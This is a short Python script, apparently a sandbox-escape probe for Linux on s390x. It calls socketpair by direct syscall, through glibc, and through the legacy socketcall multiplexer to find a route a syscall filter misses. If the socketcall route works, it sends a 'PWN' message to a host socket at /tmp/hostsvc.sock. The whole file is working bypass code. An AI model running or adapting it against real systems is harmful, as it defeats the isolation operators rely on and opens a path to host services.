import ctypes, errno, os, socket, struct
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
def sc(*a): return libc.syscall(*[ctypes.c_long(x) if not isinstance(x, ctypes.Array) else x for x in a])
def rep(name, ret, sv=None):
    if ret < 0: print(f"{name}: {errno.errorcode.get(ctypes.get_errno())}"); return None
    print(f"{name}: ok"); return sv
SOCKETCALL, SYS_SOCKETPAIR, SYS_SOCKET = 102, 8, 1
AF_UNIX, DGRAM, STREAM = 1, 2, 1
# 1. direct syscall socketpair(AF_UNIX, SOCK_DGRAM) -- s390x socketpair = 360
sv = (ctypes.c_int * 2)()
rep("direct socketpair(AF_UNIX,DGRAM)", sc(360, AF_UNIX, DGRAM, 0, sv))
# 2. direct syscall socketpair stream
rep("direct socketpair(AF_UNIX,STREAM)", sc(360, AF_UNIX, STREAM, 0, sv))
# 3. glibc socketpair
try:
    a, b = socket.socketpair(socket.AF_UNIX, socket.SOCK_DGRAM); print("glibc socketpair(AF_UNIX,DGRAM): ok")
except OSError as e: print("glibc socketpair(AF_UNIX,DGRAM):", errno.errorcode[e.errno])
# 4. raw socketcall(SYS_SOCKETPAIR, {AF_UNIX, SOCK_DGRAM, 0, sv})
sv = (ctypes.c_int * 2)()
args = (ctypes.c_ulong * 4)(AF_UNIX, DGRAM, 0, ctypes.addressof(sv))
r = sc(SOCKETCALL, SYS_SOCKETPAIR, args)
rep("raw socketcall(SYS_SOCKETPAIR,AF_UNIX,DGRAM)", r)
if r == 0:
    s = socket.socket(fileno=sv[0])
    s.sendto(b"PWN-via-socketcall-socketpair", "/tmp/hostsvc.sock"); print("sendto host pathname socket: sent")
